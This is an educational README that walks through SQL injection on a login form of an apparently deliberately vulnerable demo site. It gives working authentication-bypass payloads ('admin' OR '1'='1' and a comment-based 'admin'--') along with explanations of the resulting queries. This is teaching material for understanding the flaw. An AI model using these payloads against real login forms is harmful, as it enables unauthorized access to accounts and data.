# sql-injection
Demonstration of a SQL injection attack performed on a vulnerable website. Please note that the website used for this demonstration was created for educational purposes and with proper authorization.

## Table of Contents
- [Introduction](#introduction)
- [Vulnerable Website](#vulnerable-website)
- [SQL Injection Attack](#sql-injection-attack)
- [Payload and Exploitation](#payload-and-exploitation)
- [Usage](#usage)
- [Disclaimer](#disclaimer)

## Introduction

SQL injection is a type of cyber attack that targets the security vulnerabilities in an application's interaction with a database. It occurs when an attacker manipulates the input fields or parameters of an application in such a way that it injects malicious SQL (Structured Query Language) code into the database query. This can lead to unauthorized access, data theft, data manipulation, and in some cases, even complete control over a database or application.

## Vulnerable Website

The vulnerable website used in this project is a demo site created for educational purposes. 
Website URL: [https://demo.testfire.net/login.jsp](https://demo.testfire.net/login.jsp)

## SQL Injection Attack

The SQL injection attack demonstrated in this project highlights the potential risks of improperly sanitized user inputs. It exploits vulnerabilities in the website's code to manipulate the backend database through crafted SQL queries.

## Payload and Exploitation
Suppose a login form takes a username and password and constructs a SQL query like this:
SELECT * FROM users WHERE username = '$input_username' AND password = '$input_password'

1. Initial attempt:
   - Username: admin
   - Password: password
   - Result: Error message indicating incorrect credentials.

2. SQL Injection attempt:
   To check if the website is vulnerable to SQL injection, I tested the following:
   - Username: admin'
   - Result: Syntax error. Encountered "password" at line 1, column 67.
   **Explanation**: The SQL query is now structured as
     SELECT * FROM users WHERE username = 'admin'' AND password = 'password'
     giving the above error.

4. Successful SQL Injection:
   - Username: admin' OR '1'='1
   - Password: you can use any password
   - Result: Successfully logged in
   **Explanation**: The SQL query is now structured as
     SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '$input_password'
     Due to the order of precedence for SQL queries, and because '1'='1' is always true, the I could effectively bypass the password check and gain unauthorized access.

5. Comment Injection:
   - Username: admin'--
   - Password: you can use any password
   - Result: Successfully logged in
   **Explanation**: The SQL query is now structured as
     SELECT * FROM users WHERE username = 'admin' <span style="color:pink">-- AND password = 'password' </span>
     The password is now not considered as that part of the query is a comment. So, I could effectively bypass the password check and gain unauthorized access.
     
## Usage
To run and explore this project, follow these steps:
1. Go to the [website](#vulnerable-website)
2. Follow [these](#payload-and-exploitation) steps (1-5)

## Disclaimer
This project and the associated demonstration are intended solely for educational purposes. The vulnerable website and the SQL injection attack were performed in a controlled environment with proper authorization. The project creators are not responsible for any misuse of the information or techniques presented here.
